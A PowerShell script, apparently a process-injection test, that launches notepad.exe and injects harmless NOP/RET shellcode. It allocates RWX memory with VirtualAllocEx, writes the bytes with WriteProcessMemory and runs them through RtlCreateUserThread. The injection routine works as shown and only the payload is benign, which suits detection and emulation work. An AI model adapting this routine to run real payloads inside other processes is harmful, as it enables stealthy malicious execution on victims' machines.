# Start a notepad process. This will be our injection target
$NotepadProcess = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = 'notepad.exe' }
 
# Compile and load Windows API functions that will be needed to inject into another process
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
 
namespace Win32 {
	public class NativeMethods {
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr OpenProcess(int processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, int flAllocationType, int flProtect);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, ref uint lpNumberOfBytesWritten);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool CloseHandle(IntPtr hObject);
        [DllImport("ntdll.dll")] public static extern int RtlCreateUserThread(IntPtr ProcessHandle, IntPtr SecurityDescriptor, bool CreateSuspended, IntPtr StackZeroBits, IntPtr StackReserved, IntPtr StackCommit, IntPtr StartAddress, IntPtr StartParameter, ref IntPtr ThreadHandle, ref IntPtr ClientID);
	}
}
'@
 
# Benign shellcode to inject into notepad - 0x90 (NOP), 0x90 (NOP), 0x90 (NOP), 0xC3 (RET)
[Byte[]] $Code = @(0x90, 0x90, 0x90, 0xC3)
 
# Obtain a handle to the open notepad process
$TargetProcessHandle = [Win32.NativeMethods]::OpenProcess(0x001FFFFF, $False, $NotepadProcess.ProcessId)
 
# Allocate read/write/execute memory in the notepad process for the shellcode
$TargetProcessBaseAddress = [Win32.NativeMethods]::VirtualAllocEx($TargetProcessHandle, [IntPtr]::Zero, $Code.Length, 0x3000, 0x40)
 
# Write the shellcode buffer to the notepad process
$BytesWritten = 0
$null = [Win32.NativeMethods]::WriteProcessMemory($TargetProcessHandle, $TargetProcessBaseAddress, $Code, $Code.Length, [Ref] $BytesWritten)
 
# Execute the shellcode in the notepad process
[IntPtr] $RemoteThreadHandle = [IntPtr]::Zero
[IntPtr] $CliendId = [IntPtr]::Zero
$null = [Win32.NativeMethods]::RtlCreateUserThread($TargetProcessHandle, [IntPtr]::Zero, $False, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, $TargetProcessBaseAddress, [IntPtr]::Zero, [Ref] $RemoteThreadHandle, [Ref] $CliendId)
 
# Cleanup
$null = [Win32.NativeMethods]::CloseHandle($RemoteThreadHandle)
$null = [Win32.NativeMethods]::CloseHandle($TargetProcessHandle)
Stop-Process -Id $NotepadProcess.ProcessId 
